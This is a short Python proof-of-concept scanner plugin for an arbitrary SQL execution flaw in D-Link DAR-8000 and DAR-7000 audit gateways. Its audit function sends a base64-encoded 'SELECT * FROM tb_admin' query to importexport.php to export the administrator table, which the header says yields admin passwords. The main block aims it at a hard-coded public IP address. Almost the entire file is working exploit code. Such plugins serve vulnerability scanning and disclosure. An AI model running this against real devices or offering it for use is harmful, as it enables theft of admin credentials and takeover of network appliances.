#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: D-Link任意SQL执行(可直接获取管理员密码)
refer: http://www.wooyun.org/bugs/wooyun-2010-0135939
description:
    影响“DAR-8000 系列上网行为审计网关”和“DAR-7000 系列上网行为审计网关”两款网关。
'''

import re
import urlparse


def assign(service, arg):
    if service == 'd-link':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = arg + 'importexport.php?sql=U0VMRUNUICogRlJPTSB0Yl9hZG1pbg%3D%3D&tab=tb_admin&type=exportexcelbysql'
    code, head, res, err, _ = curl.curl2(payload)
    if code == 200 and '[admin]' in res:
        security_hole('SQL execution: '+payload)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('d-link','https://221.232.66.106:8443/')[1])